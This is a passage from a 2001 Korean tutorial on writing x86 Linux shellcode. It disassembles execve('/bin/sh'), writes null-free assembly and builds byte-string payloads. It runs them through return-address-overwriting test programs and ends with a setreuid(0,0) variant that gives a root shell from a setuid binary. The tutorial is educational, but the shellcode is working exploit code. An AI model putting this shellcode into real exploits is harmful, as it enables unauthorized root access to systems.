+ 804841c:       eb 17                   jmp    8048435 <strings>
+
+0804841e <start>:
+ 804841e:       5e                      pop    %esi
+ 804841f:       31 c0                   xor    %eax,%eax
+ 8048421:       31 db                   xor    %ebx,%ebx
+ 8048423:       31 d2                   xor    %edx,%edx
+ 8048425:       b0 04                   mov    $0x4,%al
+ 8048427:       b3 01                   mov    $0x1,%bl
+ 8048429:       89 f1                   mov    %esi,%ecx
+ 804842b:       b2 17                   mov    $0x17,%dl
+ 804842d:       cd 80                   int    $0x80
+ 804842f:       b0 01                   mov    $0x1,%al
+ 8048431:       31 db                   xor    %ebx,%ebx
+ 8048433:       cd 80                   int    $0x80
+
+08048435 <strings>:
+ 8048435:       e8 e4 ff ff ff          call   804841e <start>
+ 804843a:       49                      dec    %ecx
+ 804843b:       27                      daa    
+ 804843c:       6d                      insl   (%dx),%es:(%edi)
+ 804843d:       20 57 69                and    %dl,0x69(%edi)
+ 8048440:       6c                      insb   (%dx),%es:(%edi)
+ 8048441:       6c                      insb   (%dx),%es:(%edi)
+ 8048442:       79 20                   jns    8048464 <__do_global_ctors_aux+0x4>
+ 8048444:       69 6e 20 4e 75 6c 6c    imul   $0x6c6c754e,0x20(%esi),%ebp
+ 804844b:       40                      inc    %eax
+ 804844c:       52                      push   %edx
+ 804844d:       6f                      outsl  %ds:(%esi),(%dx)
+ 804844e:       6f                      outsl  %ds:(%esi),(%dx)
+ 804844f:       74 0a                   je     804845b <strings+0x26>
+             :
+             :  
+위에 나타난 결과와 같이 기계어코드중에 NULL 코드가 없는 것을 확인할수 있다.  아래 test42.c
+는 위에서 얻은 기계어코드를 main()의 ret에 넣고 실행하는 프로그램이다.
+
+[willy@Null@Root]$ cat test42.c 
+char print_code[] =
+"\xeb\x17\x5e\x31\xc0\x31\xdb\x31\xd2\xb0\x04\xb3\x01\x89\xf1"
+"\xb2\x17\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xe4\xff\xff\xff"
+"I'm willy in Null@Root\n";
+
+main()
+{
+   int *ret;
+
+   ret = (int *)&ret + 2;
+   (*ret) = (int)print_code;
+}
+
+[willy@Null@Root]$ gcc test42.c -o test42
+[willy@Null@Root]$ ./test42
+I'm willy in Null@Root
+
+문제없이 잘 실행되는 것을 볼수 있다.  지금까지 Shellcode만들기 위한 기본 지식은 다 배웠다. 
+특히 system call개념과 문자열의 상대주소를 구하는 방법을 이해하였다면 Shellcode 뿐만 아니라
+system call을 이용한 시스템에 기본 루틴(함수)를 수행하는데 어려움이 없을 것이다. 
+
+<shellcode 만들기>
+이제 본격적으로 shellcode를 만드는 작업을 해보자. 일반적으로 가장 간단하게 shell을 띄우는 방법
+에는 system()이나 execve()종류의 함수를 써서 프로그램을 만들수 있다. 그중에서 system call을 
+할수 함수를 /usr/include/asm/unistd.h에서 찾아보면 execve()있다. 이 함수를 이용하여 간단한 
+C언어 프로그램을 만들어 보자.
+
+[willy@Null@Root]$ cat test51.c
+main()
+{
+  char *name[2];
+  name[0] = "/bin/sh";
+  name[1] = NULL;
+  execve(name[0],name,NULL);
+}
+
+이렇게 만들수 있으며 이것을 -stack 옵션을 추가해서 컴퍼일 한뒤 gdb로 disassemble해서 내용를
+살펴보면 위에서 설명했던 write() 함수보다 다소 복잡한 구조임을 알수 있다. 
+
+[willy@Null@Root]$ gcc test51.c -o test51 -mpreferred-stack-boundary=2 -static
+
+[willy@Null@Root]$ gdb -q test51
+(gdb) disassemble main
+Dump of assembler code for function main:
+0x80481dc <main>:       push   %ebp
+0x80481dd <main+1>:     mov    %esp,%ebp
+0x80481df <main+3>:     sub    $0x8,%esp
+0x80481e2 <main+6>:     movl   $0x808b228,0xfffffff8(%ebp)
+0x80481e9 <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+0x80481f0 <main+20>:    push   $0x0
+0x80481f2 <main+22>:    lea    0xfffffff8(%ebp),%eax
+0x80481f5 <main+25>:    push   %eax
+0x80481f6 <main+26>:    pushl  0xfffffff8(%ebp)
+0x80481f9 <main+29>:    call   0x804c36c <__execve>
+0x80481fe <main+34>:    add    $0xc,%esp
+0x8048201 <main+37>:    leave  
+0x8048202 <main+38>:    ret    
+0x8048203 <main+39>:    nop    
+End of assembler dump.
+(gdb) disassemble __execve
+Dump of assembler code for function __execve:
+0x804c36c <__execve>:   push   %ebp
+0x804c36d <__execve+1>: mov    $0x0,%eax
+0x804c372 <__execve+6>: mov    %esp,%ebp
+0x804c374 <__execve+8>: test   %eax,%eax
+0x804c376 <__execve+10>:        push   %edi
+0x804c377 <__execve+11>:        push   %ebx
+0x804c378 <__execve+12>:        mov    0x8(%ebp),%edi
+0x804c37b <__execve+15>:        je     0x804c382 <__execve+22>
+0x804c37d <__execve+17>:        call   0x0
+0x804c382 <__execve+22>:        mov    0xc(%ebp),%ecx
+0x804c385 <__execve+25>:        mov    0x10(%ebp),%edx
+0x804c388 <__execve+28>:        push   %ebx
+0x804c389 <__execve+29>:        mov    %edi,%ebx
+0x804c38b <__execve+31>:        mov    $0xb,%eax
+0x804c390 <__execve+36>:        int    $0x80
+0x804c392 <__execve+38>:        pop    %ebx
+0x804c393 <__execve+39>:        mov    %eax,%ebx
+0x804c395 <__execve+41>:        cmp    $0xfffff000,%ebx
+0x804c39b <__execve+47>:        jbe    0x804c3ab <__execve+63>
+0x804c39d <__execve+49>:        neg    %ebx
+0x804c39f <__execve+51>:        call   0x80483b4 <__errno_location>
+0x804c3a4 <__execve+56>:        mov    %ebx,(%eax)
+0x804c3a6 <__execve+58>:        mov    $0xffffffff,%ebx
+0x804c3ab <__execve+63>:        mov    %ebx,%eax
+0x804c3ad <__execve+65>:        pop    %ebx
+0x804c3ae <__execve+66>:        pop    %edi
+0x804c3af <__execve+67>:        pop    %ebp
+0x804c3b0 <__execve+68>:        ret    
+End of assembler dump.
+
+우리의 목적은 위의 disassemle 내용에서 %eax,%ebx,%ecx,%edx... 에 어떤 값들이 들어가는지만
+알아낼수 있으면 된다. 하나씩 순서대로 훌터보기로 하자.. 먼저 main()에서 인수가 어떻게 stack
+에 들어 가는지 보자.
+
+0x80481dc <main>:       push   %ebp
+0x80481dd <main+1>:     mov    %esp,%ebp
+함수에 첨들어 오면서 %ebp를 초기 %esp값으로 설정한다.
+
+0x80481df <main+3>:     sub    $0x8,%esp
+char *name[2];  주소(4바이트) * 2 = 8바이트를 변수공간으로 확보.
+
+0x80481e2 <main+6>:     movl   $0x808b228,0xfffffff8(%ebp)
+name[0] = "/bin/sh";  %ebp를 기준으로 -8바이트 위치에 문자열의 주소를 넣음.
+
+0x80481e9 <main+13>:    movl   $0x0,0xfffffffc(%ebp)
+name[1] = NULL;    %ebp기준 -4바이트 위치에 0을 넣음.
+
+0x80481f0 <main+20>:    push   $0x0
+0을 stack에 저장함.
+
+0x80481f2 <main+22>:    lea    0xfffffff8(%ebp),%eax
+%ebp -8에 주소(문자열주소)를 %eax에 넣음. 주소의 주소.
+
+0x80481f5 <main+25>:    push   %eax
+문자열 주소의 주소를 stack에 저장함.
+
+0x80481f6 <main+26>:    pushl  0xfffffff8(%ebp)
+문자열의 주소를 stack에 저장함.
+
+0x80481f9 <main+29>:    call   0x804c36c <__execve>
+execve()함수를 호출함.
+
+0x804c36c <__execve>:   push   %ebp
+0x804c36d <__execve+1>: mov    $0x0,%eax
+0x804c372 <__execve+6>: mov    %esp,%ebp
+이 싯점에서 stack에 쌓여있는 data를 보면
+
+        +---------------+
+        |      %ebp     |   <--- %ebp 값                    (낮은 주소)
+        +---------------+
+        |      ret      |    %ebp + 0x04
+        +---------------+
+        |    name[0]    |    %ebp + 0x08    ---> %ebx
+        +---------------+
+        |     name      |     %ebp + 0x0c    ---> %ecx  
+        +---------------+
+        |     0x00      |    %ebp + 0x10    ---> %edx       (높은 주소)
+        +---------------+
+
+0x804c374 <__execve+8>: test   %eax,%eax
+0x804c376 <__execve+10>:        push   %edi
+0x804c377 <__execve+11>:        push   %ebx
+0x804c378 <__execve+12>:        mov    0x8(%ebp),%edi
+0x804c37b <__execve+15>:        je     0x804c382 <__execve+22>
+0x804c37d <__execve+17>:        call   0x0
+0x804c382 <__execve+22>:        mov    0xc(%ebp),%ecx
+0x804c385 <__execve+25>:        mov    0x10(%ebp),%edx
+0x804c388 <__execve+28>:        push   %ebx
+0x804c389 <__execve+29>:        mov    %edi,%ebx
+0x804c38b <__execve+31>:        mov    $0xb,%eax
+0x804c390 <__execve+36>:        int    $0x80
+
+최종적으로 int $0x80이전에 %eax,%ebx,%ecx,%edx에 값들이 아래와 같이 채워진 것을 볼수 있다.
+
+       %eax   --->    0xb    ( execve()에 대한 system call No. )
+       %ebx   --->    name[0]
+       %ecx   --->    name
+       %edx   --->    0x00  ( execve()의 마지막 인수 )
+
+이 정보를 가지고 어셈블리로 shellcode 프로글램을 만들어 보자. 이 shellcode를 구현하기 위해서는
+2가지 더 고려해야 할 점이 있다. 하나는 문자열의 끝에 NULL을 넣어서 문자의 끝을 알리는 작업을 
+해야 하며, 다른 하나는 name을 구현해 줘야 한다는 것이다.  즉 name = [문자열주소]+[NULL] 이다.
+그래서 문자열의 위치는 jmp & call을 이용하여 상대주소를 알수 있으므로 문자열 뒤에 name를 구현
+하면된다. 아래 어셈블리 프로그램을 보자.
+
+
+[willy@Null@Root]$ cat test51.s
+.globl main
+main:
+         jmp     strings
+start:   popl    %esi                <--- 문자열 위치 (문자열은 /bin/sh 7자)
+         movb    $0x00,0x7(%esi)     <--- 문자열 끝에 NULL위치 (문자열이 끝남을 알림)
+         movl    %esi, 0x8(%esi)     <--- name[0]을 구현하기 위해 문자열 뒤에 넣음.
+         movl    $0x00,0xc(%esi)     <--- name[1]을 구현하기 위해서 name[0]뒤에 NULL을 넣음.
+         movl    $0x0b,%eax          <--- %eax에 0xb(11)을 넣어 execve() system call함. 
+         movl    %esi, %ebx          <--- %ebx에 문자열을 넣음.
+         leal    0x8(%esi), %ecx     <--- %ecx에 name = name[0]+name[1]을 넣음.
+         movl    0xc(%esi), %edx     <--- %edx에 NULL(0x00)을 넣는다.
+         int     $0x80               <--- interrupt 0x80을 해서 system call을 함.
+         movl    $0x01,%eax
+         movl    $0x00,%ebx
+         int     $0x80               <--- exit(0) system call.  
+strings: call start
+         .string "/bin/sh"
+
+[willy@Null@Root]$ gcc test51.s -o test51
+
+[willy@Null@Root]$ objdump -d test51
+
+           :
+0804841c <main>:
+ 804841c:       eb 2a                   jmp    8048448 <strings>
+
+0804841e <start>:
+ 804841e:       5e                      pop    %esi
+ 804841f:       c6 46 07 00             movb   $0x0,0x7(%esi)
+ 8048422:       89 76 08                mov    %esi,0x8(%esi)
+ 8048426:       c7 46 0c 00 00 00 00    movl   $0x0,0xc(%esi)
+ 804842d:       b8 0b 00 00 00          mov    $0xb,%eax
+ 8048432:       89 f3                   mov    %esi,%ebx
+ 8048434:       8d 4e 08                lea    0x8(%esi),%ecx
+ 8048437:       8b 56 0c                mov    0xc(%esi),%edx
+ 804843a:       cd 80                   int    $0x80
+ 804843c:       b8 01 00 00 00          mov    $0x1,%eax
+ 8048441:       bb 00 00 00 00          mov    $0x0,%ebx
+ 8048446:       cd 80                   int    $0x80
+
+08048448 <strings>:
+ 8048448:       e8 d1 ff ff ff          call   804841e <start>
+ 804844d:       2f                      das    
+ 804844e:       62 69 6e                bound  %ebp,0x6e(%ecx)
+ 8048451:       2f                      das    
+ 8048452:       73 68                   jae    80484bc <gcc2_compiled.+0x20>
+           :
+
+여기서 얻어진 기계어코드를 정리해서 아래 test43.c와 같이 ret 주소에 기계어코드가 들어가도록
+하는 shellcode구동 프로그램을 만들어 실행해 보자.
+
+[willy@Null@Root]$ cat test43.c 
+
+char sc[] =
+"\xeb\x2a\x5e\xc6\x46\x07\x00\x89\x76\x08\xc7\x46\x0c\x00\x00\x00\x00"
+"\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8b\x56\x0c\xcd\x80\xb8\x01"
+"\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff\xff/bin/sh";
+
+main()
+{
+   int *ret;
+
+   ret = (int *)&ret + 2;
+   (*ret) = (int)sc;
+}
+
+[willy@Null@Root]$ gcc test43.c -o test43
+
+[willy@Null@Root]$ ./test43
+sh-2.04$ 
+
+shell을 얻는데 성공하였다.. 최종적으로 코드내에 NULL이 나타나는 부분을 아래 test52.s와 같이
+수정하고 이번에는 gdb를 이용하여 기계어코드를 만들어 보자.
+
+             수정전                |             수정후  
+       ----------------------------+------------------------------
+       movb    $0x00,0x7(%esi)     |      xor    %eax,  %eax
+                                   |      movb   %al,   0x7(%esi)
+       movl    $0x00,0xc(%esi)     |      movl   %eax,  0xc(%esi)
+       movl    0xc(%esi), %edx     |      xor    %edx,  %edx
+
+[willy@Null@Root]$ cat test52.s
+.globl main
+main:
+        jmp     strings
+start:  popl    %esi
+        movl    %esi, 0x8(%esi)
+        xor     %eax,  %eax
+        movb    %al, 0x7(%esi)
+        movl    %eax, 0xc(%esi)
+        movb    $0x0b, %al
+        movl    %esi, %ebx
+        leal    0x8(%esi), %ecx
+        xor     %edx, %edx
+        int     $0x80
+        movb    $0x01,%al
+        xor     %ebx, %ebx
+        int     $0x80
+strings:call start
+        .string "/bin/sh"
+
+
+[willy@Null@Root]$ gcc test52.s -o test52
+
+컴퍼일한뒤 gdb로 실행화일를 연후 disassemble main을 해보면 바로 jump가 시작되는 것을 볼수 
+있다. 그러므로 x/40bx main 하면 기계어코드를 볼수 있다. 
+
+[willy@Null@Root]$ gdb -q test52
+(gdb) disassem main
+Dump of assembler code for function main:
+0x804841c <main>:       jmp    0x804843b <strings>
+End of assembler dump.
+(gdb) disassem start
+Dump of assembler code for function start:
+0x804841e <start>:      pop    %esi
+0x804841f <start+1>:    mov    %esi,0x8(%esi)
+0x8048422 <start+4>:    xor    %eax,%eax
+0x8048424 <start+6>:    mov    %al,0x7(%esi)
+0x8048427 <start+9>:    mov    %eax,0xc(%esi)
+0x804842a <start+12>:   mov    $0xb,%al
+0x804842c <start+14>:   mov    %esi,%ebx
+0x804842e <start+16>:   lea    0x8(%esi),%ecx
+0x8048431 <start+19>:   xor    %edx,%edx
+0x8048433 <start+21>:   int    $0x80
+0x8048435 <start+23>:   mov    $0x1,%al
+0x8048437 <start+25>:   xor    %ebx,%ebx
+0x8048439 <start+27>:   int    $0x80
+End of assembler dump.
+(gdb) disassem strings
+Dump of assembler code for function strings:
+0x804843b <strings>:    call   0x804841e <start>
+0x8048440 <strings+5>:  das    
+0x8048441 <strings+6>:  bound  %ebp,0x6e(%ecx)
+0x8048444 <strings+9>:  das    
+0x8048445 <strings+10>: jae    0x80484af <_fini+35>
+0x8048447 <strings+12>: add    %dl,0x90909090(%eax)
+0x804844d <strings+18>: nop    
+0x804844e <strings+19>: nop    
+0x804844f <strings+20>: nop    
+End of assembler dump.
+(gdb) x/40bx main
+0x804841c <main>:       0xeb    0x1d    0x5e    0x89    0x76    0x08    0x31    0xc0
+0x8048424 <start+6>:    0x88    0x46    0x07    0x89    0x46    0x0c    0xb0    0x0b
+0x804842c <start+14>:   0x89    0xf3    0x8d    0x4e    0x08    0x31    0xd2    0xcd
+0x8048434 <start+22>:   0x80    0xb0    0x01    0x31    0xdb    0xcd    0x80    0xe8
+0x804843c <strings+1>:  0xde    0xff    0xff    0xff    0x2f    0x62    0x69    0x6e
+
+여기서 구한 기계어코드를 shellcode 구동 프로그램(test44.c)에 넣어 실행시키면 정상적으로
+shell이 뜨는것을 확인할수 있다.
+
+[willy@Null@Root]$ cat test44.c 
+char sc1[] =
+"\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d"
+"\x4e\x08\x31\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+main()
+{
+   int *ret;
+
+   ret = (int *)&ret + 2;
+   (*ret) = (int)sc1;
+}
+
+[willy@Null@Root]$ gcc test44.c -o test44
+
+[willy@Null@Root]$ ./test44
+sh-2.04$ ps
+  PID TTY          TIME CMD
+ 9238 pts/6    00:00:00 bash
+ 9262 pts/6    00:00:00 sh
+ 9264 pts/6    00:00:00 ps
+
+이제 shellcode를 완성하였다. 그러나 linux 7.0이상에서 이 shellcode를 사용하기 위해서는 하나더
+기계코드를 만들어 주어야 한다. 그것은 바로 setreuid()을 shellcode앞에 추가하는 것이다.
+setreuid()의 기계어코드 만드는 것에 대해서는 단순하기 때문에 자세히 설명하지 않는다. 
+root uid를 설정하는 setreuid() 코드는 아래와 같다.
+
+main()
+{
+   setreuid(0,0);
+}
+
+       \x31\xc0         // xor %eax,%eax
+       \xb0\x46         // mov $0x46,%al
+       \x31\xdb         // xor %ebx,%ebx
+       \x31\xc9         // xor %ecx,%ecx
+       \xcd\x80         // int $0x80
+
+이렇게 만들어진 코드를 shellcode앞에 붙여 아래와 shell구동 프로그램을 만든뒤  컴퍼일 하여
+실행화일에 root setuid을 붙여보자.
+
+[willy@Null@Root]$ cat test45.c
+char sc[] =
+"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80"   // setreuid(0,0);
+"\xeb\x1d\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x31"
+"\xd2\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xde\xff\xff\xff/bin/sh";
+
+main()
+{
+   int *ret;
+
+   ret = (int *)&ret + 2;
+   (*ret) = (int)sc;
+}
+
+[willy@Null@Root]$ gcc test45.c -o test45
+
+[root@Null@Root]# chown root test45
+
+[root@Null@Root]# chmod 4755 test45
+
+[root@Null@Root]# ls -al
+drwxrwxr-x    2 willy    willy        4096 Sep 12 19:53 .
+drwxrwxr-x   12 willy    willy        4096 Sep  4 07:34 ..
+-rwsr-xr-x    1 root     willy       13825 Sep 12 19:53 test45
+
+이제 willy 권한으로 test45를 실해시켜보자. 
+
+[willy@Null@Root]$ ./test45
+sh-2.04# id
+uid=0(root) gid=501(willy) groups=501(willy)
+
+드디어 root shell을 얻었다. 이제 shellcode 만들기가 모두 끝났다. 메모리의 구조 부터 시작하여, 
+어셈블리어의 기본 구조와 명령어, 그리고 system call을 이용한 shellcode 까지..  가능한한 모든 
+내용을 쉽게 이해 할수 있도록 설명하려 노력하였다. 이 문서가 shellcode제작을 이해하는데 도움이
+되었으면 하는 바램이다. 시간이 있는 사람은 /usr/include/asm/unistd.h에 있는 300여개의 system
+call 함수들 중에 몇가지를 이용하여 재미있는 기계어코드를 만들어 보는것도 좋을듯 하다. 
+암튼 내용중 의문이 있거나 수정할 부분이 있으면 언제라도 연락 바란다. 
+참고로 OS나 CPU가 다른 경우 메모리 부분이나 레지스터, 그리고 어셈블리의 구조가 다를수 있다. 
+이부분에 대해서는 bacchante project (http://165.246.33.21/bacchante)을 참고하고 각자 응용해 
+보기 바란다.
+
+        2001. 09. 12  미국 테러사건이 발생한 다음날...   willy ..  (9/13 일부수정)
+
+
+
+
+
+
+
+
